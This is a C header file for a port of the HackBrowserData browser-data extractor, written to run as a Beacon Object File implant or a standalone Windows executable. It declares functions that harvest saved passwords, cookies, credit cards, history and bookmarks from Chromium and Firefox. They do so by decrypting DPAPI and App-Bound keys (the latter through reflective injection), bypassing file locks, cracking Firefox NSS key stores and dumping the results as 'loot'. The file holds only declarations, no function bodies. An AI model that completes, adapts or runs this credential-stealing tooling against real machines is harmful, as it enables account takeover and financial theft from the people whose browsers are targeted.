/* bd.h - HackBrowserData -> C/BOF conversion: shared core API.
 *
 * Port of the Go HackBrowserData engine (Chromium + Firefox extraction) to
 * dependency-free C for use both as a Beacon Object File and as a standalone
 * Windows executable. Windows-only.
 */
#ifndef BD_H
#define BD_H

#include <stdarg.h>
#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---------------------------------------------------------------- kinds -- */
#define BD_KIND_CHROMIUM       0
#define BD_KIND_CHROMIUM_OPERA 1   /* flat layout: no profile subdirs          */
#define BD_KIND_CHROMIUM_YANDEX 2  /* yandex special-cased tables (partial)    */
#define BD_KIND_FIREFOX        3

typedef struct {
    const char *key;      /* short id: "chrome", "edge", ...               */
    const char *name;     /* display name                                  */
    const char *userDir;  /* under %LOCALAPPDATA% or %APPDATA%; may contain
                             single '*' wildcard component                  */
    const char *baseEnv;  /* "LOCALAPPDATA" or "APPDATA"                   */
    int         kind;
    int         abe;      /* browser ships Chrome App-Bound (v20 capable)  */
} bd_browser_t;

/* ----------------------------------------------------------- categories -- */
#define BD_CAT_PASSWORDS    0x01
#define BD_CAT_COOKIES      0x02
#define BD_CAT_HISTORY      0x04
#define BD_CAT_DOWNLOADS    0x08
#define BD_CAT_CREDITCARDS  0x10
#define BD_CAT_BOOKMARKS    0x20
#define BD_CAT_ALL          0x3F

#define BD_FMT_JSON 0
#define BD_FMT_CSV  1

typedef struct {
    void (*logf)(void *ctx, const char *fmt, ...);  /* summary / status lines */
    void (*chunk)(void *ctx, const char *data, int len); /* inline loot dump  */
    void *ctx;
    const char *outDir;   /* loot directory (created if missing); NULL = stdout only */
    int  fmt;             /* BD_FMT_JSON / BD_FMT_CSV                       */
    int  verbose;         /* stream full loot through chunk()               */
    int  human;           /* one human-readable line per row via chunk()    */
} bd_out;

/* ------------------------------------------------------------ run entry -- */
/* Extract everything. Returns number of loot files written; fills countOut
 * rows extracted (optional). Logs progress through out->logf. */
int  bd_run(const char *browserKey /* NULL or "all" */, int catMask,
            bd_out *out, int *rowsOut);

/* parse "all" / "passwords,cookies,..." into a BD_CAT_* mask */
int  bd_cat_mask_parse(const char *spec);

/* ---------------------------------------------------------- registry --- */
typedef struct bd_keys bd_keys_t;   /* forward: full def in crypto section */
int bd_browser_count(void);
const bd_browser_t *bd_browser_at(int i);
const bd_browser_t *bd_browser_find(const char *key);
/* enumerate every profile of a browser; cb returns nonzero to continue */
void bd_for_each_profile(const bd_browser_t *br,
                         int (*cb)(void *ctx, const char *profileDir), void *ctx);
/* read Local State, unwrap v10 key (DPAPI); v20 via reflective ABE injection */
void bd_load_chromium_keys(const char *browserKey, const char *profileDir, bd_keys_t *keys);
int  bd_abe_get_key(const char *browserKey, const char *localStatePath, unsigned char keyOut[32]);

/* kernel32 LocalFree wrapper for DPAPI buffers */
unsigned long bd_local_free(unsigned long p);

/* Human-readable category name for a mask bit (returns "unknown" if many). */
const char *bd_cat_name(int cat);

/* -------------------------------------------------------- string builder -- */
typedef struct { char *buf; size_t len, cap; } bd_sb;
int  bd_sb_init(bd_sb *sb);
int  bd_sb_put(bd_sb *sb, const char *s);
int  bd_sb_cat(bd_sb *sb, const char *s, size_t n);
int  bd_sb_json_str(bd_sb *sb, const char *s);     /* quoted + escaped       */
int  bd_sb_csv_field(bd_sb *sb, const char *s);
void bd_sb_free(bd_sb *sb);

/* --------------------------------------------------------------- strings -- */
int  bd_str_ieq(const char *a, const char *b);
int  bd_str_ieq_n(const char *a, const char *b, size_t n);
char *bd_strdup(const char *s);
/* join: "dir/child" with backslashes, into dst (cap). returns dst or NULL */
char *bd_path_join(char *dst, size_t cap, const char *dir, const char *child);
const char *bd_path_name(const char *path);       /* basename component      */

/* ------------------------------------------------------------------ time -- */
/* chrome: 1 = webkit (1601 us), firefox: 0 = unix us. Formats
 * "YYYY-MM-DD HH:MM:SS" (UTC) into dst, or "-" when ts == 0. */
void bd_fmt_time(char *dst, size_t cap, long long ts, int chrome);

/* ------------------------------------------------------------------- fs -- */
int   bd_read_file(const char *path, char **dataOut, size_t *lenOut);
int   bd_write_file(const char *path, const char *data, size_t len);
int   bd_copy_file(const char *src, const char *dst);   /* with retry       */
int   bd_copy_locked_file(const char *src, const char *dst); /* handle-dup bypass */
int   bd_mkdir(const char *path);
int   bd_dir_exists(const char *path);
int   bd_rmdir(const char *path);   /* RemoveDirectoryA (empty dir)      */
/* expand one '*' component in path; calls cb for each match; returns count */
int   bd_glob1(const char *pattern, int (*cb)(const char *path, void *ctx), void *ctx);
char *bd_temp_dir(void);   /* %TEMP%\hbd - malloc'd, caller frees           */

/* ---------------------------------------------------------------- crypto -- */
int bd_sha1(const unsigned char *d, size_t n, unsigned char out[20]);
int bd_sha256(const unsigned char *d, size_t n, unsigned char out[32]);
void bd_hmac_sha1(const unsigned char *key, size_t klen,
                  const unsigned char *d, size_t n, unsigned char out[20]);
void bd_hmac_sha256(const unsigned char *key, size_t klen,
                    const unsigned char *d, size_t n, unsigned char out[32]);
void bd_pbkdf2(int sha256 /*1=sha256,0=sha1*/, const unsigned char *pw, size_t pwlen,
               const unsigned char *salt, size_t saltlen,
               int iters, unsigned char *out, size_t dlen);

int bd_aes_gcm_decrypt(const unsigned char *key, size_t klen,
                       const unsigned char *nonce, size_t nlen,
                       const unsigned char *aad, size_t alen,
                       const unsigned char *ct, size_t clen,
                       unsigned char *pt, size_t *ptlen);
int bd_aes_cbc_decrypt(const unsigned char *key, size_t klen,
                       const unsigned char *iv,
                       const unsigned char *ct, size_t clen,
                       unsigned char *pt, size_t *ptlen);
int bd_des3_cbc_decrypt(const unsigned char *key, size_t klen,
                        const unsigned char *iv,
                        const unsigned char *ct, size_t clen,
                        unsigned char *pt, size_t *ptlen);
/* DPAPI CryptUnprotectData; returns malloc'd plaintext */
int bd_dpapi_decrypt(const unsigned char *ct, size_t clen,
                     unsigned char **ptOut, size_t *ptLenOut);

int bd_base64_decode(const char *in, size_t inlen, unsigned char **out, size_t *outlen);

typedef struct bd_keys {
    unsigned char v10[32]; int v10len;   /* DPAPI-wrapped Local State key     */
    unsigned char v20[32]; int v20len;   /* ABE key (phase 2: may be absent)  */
    int have_localstate;
} bd_keys_t;

/* decrypt one chromium blob (v10/v20/DPAPI-prefixed). Returns malloc'd plain,
 * sets *outlen; returns NULL on failure. Applies CBC fallback logic. */
unsigned char *bd_chromium_decrypt(const bd_keys_t *keys,
                                   const unsigned char *ct, size_t clen,
                                   size_t *outlen);

/* strip sha256(host) cookie prefix (Chrome 130+), in place; returns new len */
size_t bd_strip_cookie_hash(unsigned char *v, size_t len, const char *host);

/* ------------------------------------------------------------------ ASN.1 */
/* NSS PBE decryptors (Firefox key4.db / logins.json). Return malloc'd plain. */
unsigned char *bd_nss_private_pbe(const unsigned char *der, size_t len,
                                  const unsigned char *globalSalt, size_t saltlen,
                                  size_t *outlen);
unsigned char *bd_nss_passwordcheck_pbe(const unsigned char *der, size_t len,
                                        const unsigned char *globalSalt, size_t saltlen,
                                        size_t *outlen);
unsigned char *bd_nss_credential_pbe(const unsigned char *der, size_t len,
                                     const unsigned char *masterKey, size_t keylen,
                                     size_t *outlen);

/* ------------------------------------------------------------------ JSON -- */
typedef struct bd_json bd_json;
/* parse; returns NULL on error. bd_json_free on done. */
bd_json *bd_json_parse(const char *data, size_t len);
void     bd_json_free(bd_json *j);
/* path lookup "os_crypt.encrypted_key"; returns node or NULL */
const bd_json *bd_json_path(const bd_json *j, const char *path);
const bd_json *bd_json_get(const bd_json *obj, const char *key);
/* value accessors (NULL/-1 if type mismatch) */
const char *bd_json_str(const bd_json *j);      /* returns internal cstring */
double      bd_json_num(const bd_json *j);
int         bd_json_is_obj(const bd_json *j);
int         bd_json_is_arr(const bd_json *j);
int         bd_json_arr_count(const bd_json *arr);
const bd_json *bd_json_arr_at(const bd_json *arr, int idx);
/* iterate object members; idx from 0; *key/*val out; returns 0 when done */
int bd_json_obj_at(const bd_json *obj, int idx, const char **key, const bd_json **val);

/* ---------------------------------------------------------------- sqlite -- */
typedef struct bd_db bd_db;
bd_db *bd_db_open_copy(const char *srcPath, const char *stagingDir,
                       char *copyPathOut, size_t cap);
void   bd_db_close(bd_db *db);
/* prepared statement helpers; -1 on error */
int bd_db_query(bd_db *db, const char *sql);
int bd_db_step(bd_db *db);           /* 1 = row, 0 = done, -1 = err */
/* column accessors for current row (col index) */
const unsigned char *bd_col_text(bd_db *db, int col, int *lenOut);
const unsigned char *bd_col_blob(bd_db *db, int col, int *lenOut);
long long bd_col_i64(bd_db *db, int col);

/* ------------------------------------------------------------- extractors -- */
/* Each returns number of rows extracted (-1 on fatal). appends JSON/CSV to
 * sb and streams/stores according to out. */
int bd_chromium_extract(const bd_browser_t *br, const char *profileDir,
                        int catMask, bd_out *out, int *files);
void bd_chromium_for_profiles(const bd_browser_t *br, int catMask,
                              bd_out *out, int *files);
int bd_firefox_extract(const bd_browser_t *br, const char *profileDir,
                       int catMask, bd_out *out, int *files);
void bd_firefox_for_profiles(const bd_browser_t *br, int catMask,
                             bd_out *out, int *files);

#ifdef __cplusplus
}
#endif
#endif /* BD_H */
